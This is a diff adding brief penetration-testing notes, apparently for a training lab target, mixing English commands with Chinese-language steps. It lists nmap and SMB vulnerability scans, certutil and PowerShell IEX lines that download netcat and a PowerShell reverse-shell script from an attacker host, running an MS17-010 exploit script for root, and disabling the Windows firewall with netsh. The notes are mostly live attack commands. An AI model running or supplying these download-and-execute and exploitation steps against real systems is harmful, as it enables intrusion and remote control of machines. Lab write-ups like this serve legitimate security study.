@@ -1,0 +1,17 @@
+nmap -sC -sV -Pn 10.11.1.75 > nmap.txt
+nmap -p-  10.11.1.75 > nmapall.txt
+nmap --script=smb-enum-shares -Pn -p 445  10.11.1.75 > nmapsmb.txt
+nmap --script=smb-vuln* -Pn -p 139,445  10.11.1.75 > nmapsmb.txt
+
+
+certutil.exe -urlcache -split -f http://192.168.119.134/nc64.exe nc64.exe
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-PowerShellTcp.ps1')
+
+1.nmap掃描出端口有samba服務,使用vuln script掃描
+nmap --script=smb-vuln* -Pn -p 139,445  10.11.1.75 > nmapsmb.txt
+2.發現有smb-vuln-ms17-010 漏洞,下載auto blue
+3.將zzz及mysmb下載過來
+4.python zzz_exploit.py 10.11.1.75 可以直接取得root權限
+5.無法連回本機kali,將防火牆關閉
+netsh firewall set opmode mode=disable
+6.使用webshell取得正常的互動式shell
